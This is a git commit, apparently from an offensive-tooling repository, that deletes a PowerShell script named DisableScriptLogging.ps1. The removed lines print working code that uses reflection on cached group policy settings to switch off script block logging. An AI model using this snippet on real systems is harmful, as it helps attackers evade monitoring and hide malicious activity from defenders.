c2a70f26399c27626b158d1a23b871d71dd417d2
kyle <kyle41111@gmail.com>
2023-01-20 13:04:19 -0500

    Delete DisableScriptLogging.ps1

--- AMSI/DisableScriptLogging.ps1
+++
@@ -1,3 +0,0 @@
-$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
-$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
-$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
